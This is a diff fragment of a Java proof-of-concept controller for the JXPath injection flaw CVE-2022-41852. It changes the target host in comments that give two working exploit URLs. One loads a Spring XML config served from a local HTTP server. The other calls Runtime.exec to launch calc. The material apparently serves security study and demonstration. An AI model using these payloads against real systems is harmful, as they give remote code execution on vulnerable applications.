@@ -39,10 +39,10 @@ public class ProofOfConcept_JXPath_Controller {
      *
      * 方式一（先启动一个web服务，再发送payload）：
      * D:\code_repository_sfq\IdeaProjects\CodeSecOne\src\main\resources\static\evil\JXPath Library (CVE-2022-41852)__calc.exe__payload>python -m http.server 8888
-     * http://192.168.199.239:8080/XPath/vulnerable-example/?path=org.springframework.context.support.ClassPathXmlApplicationContext.new(%22http://127.0.0.1:8888/calc.xml%22)
+     * http://127.0.0.1:28888/XPath/vulnerable-example/?path=org.springframework.context.support.ClassPathXmlApplicationContext.new(%22http://127.0.0.1:8888/calc.xml%22)
      *
      * 方式二（直接发送payload）：
-     * http://192.168.199.239:8080/XPath/vulnerable-example/?path=exec(java.lang.Runtime.getRuntime(),%27calc%27)
+     * http://127.0.0.1:28888/XPath/vulnerable-example/?path=exec(java.lang.Runtime.getRuntime(),%27calc%27)
      **/
 
 
